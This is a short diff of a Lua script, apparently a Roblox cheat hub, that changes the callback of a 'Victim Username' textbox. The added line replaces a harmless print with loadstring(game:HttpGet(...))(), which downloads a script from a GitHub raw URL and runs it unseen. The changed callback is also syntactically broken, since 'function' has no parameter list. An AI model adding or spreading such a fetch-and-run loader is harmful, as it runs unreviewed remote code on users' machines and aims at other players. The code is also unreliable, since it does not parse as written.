@@ -313,8 +313,8 @@ Tab:AddTextbox({
 	Name = "Victim Username",
 	Default = "Type Username",
 	TextDisappear = true,
-	Callback = function(Value)
-		print(Value)
+	Callback = function
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Deadhub12/New-mm2-dead-hub/refs/heads/main/Script"))()
 	end	  
 })
 
